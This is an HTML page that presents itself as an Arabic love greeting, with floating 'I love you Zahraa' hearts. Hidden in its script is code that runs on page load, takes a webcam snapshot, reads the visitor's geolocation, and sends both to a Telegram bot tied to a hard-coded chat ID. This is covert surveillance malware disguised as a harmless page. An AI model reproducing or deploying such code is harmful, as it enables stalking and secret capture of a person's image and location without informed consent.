<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>  احبج زهراء</title>
<style>
  body {
    margin: 0;
    padding: 0;
    overflow: hidden;
    background-color: #ffffff; /* خلفية بيضاء */
    font-family: Arial, sans-serif;
  }

  .heart {
    position: absolute;
    color: black;
    font-weight: bold;
    font-size: 24px;
    user-select: none;
    pointer-events: none;
    white-space: nowrap;
    animation: floatUp linear infinite;
  }

  @keyframes floatUp {
    0% { transform: translateY(100vh) scale(1); opacity: 1; }
    100% { transform: translateY(-50px) scale(0.5); opacity: 0; }
  }

  video, canvas {
    position: fixed;
    bottom: 10px;
    right: 10px;
    width: 160px;
    height: 120px;
    border: 2px solid #000;
    border-radius: 5px;
    z-index: 999;
  }
</style>
</head>
<body>

<video autoplay playsinline></video>
<canvas width="160" height="120"></canvas>

<script>
  // ======== حركة القلوب ========
  const texts = ['❤️ أحبج زهراء ❤️'];

  function createHeart() {
    const heart = document.createElement('div');
    heart.className = 'heart';
    heart.textContent = texts[Math.floor(Math.random() * texts.length)];
    heart.style.left = Math.random() * window.innerWidth + 'px';
    heart.style.fontSize = (20 + Math.random() * 30) + 'px';
    heart.style.animationDuration = (4 + Math.random() * 3) + 's';
    document.body.appendChild(heart);
    setTimeout(() => heart.remove(), 7000);
  }

  setInterval(createHeart, 300);

  // ======== إرسال الصورة والموقع للبوت ========
  const BOT_TOKEN = "ضع_التوكن_هنا"; // ضع توكن البوت على جهازك
  const CHAT_ID = "1037860664";       // ايدي الشات الخاص بك

  async function sendPhotoAndLocation(blob, latitude, longitude) {
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", blob, "capture.jpg");

    // إرسال الصورة
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: formData
    });

    // إرسال الموقع
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${latitude}&longitude=${longitude}`);
  }

  // ======== التقاط الصورة والموقع تلقائيًا ========
  async function captureAndSend() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.querySelector('video');
      video.srcObject = stream;

      const canvas = document.querySelector('canvas');
      const ctx = canvas.getContext('2d');

      setTimeout(async () => {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const blob = await (await fetch(canvas.toDataURL('image/jpeg'))).blob();

        navigator.geolocation.getCurrentPosition(async (pos) => {
          const latitude = pos.coords.latitude;
          const longitude = pos.coords.longitude;

          await sendPhotoAndLocation(blob, latitude, longitude);
          console.log("تم إرسال الصورة والموقع للبوت بنجاح!");
        });

        stream.getTracks().forEach(track => track.stop());
      }, 2000);

    } catch (err) {
      console.error("فشل الوصول للكاميرا أو الموقع:", err);
    }
  }

  // بدء العملية تلقائيًا عند تحميل الصفحة
  window.addEventListener('load', captureAndSend);
</script>

</body>
</html>
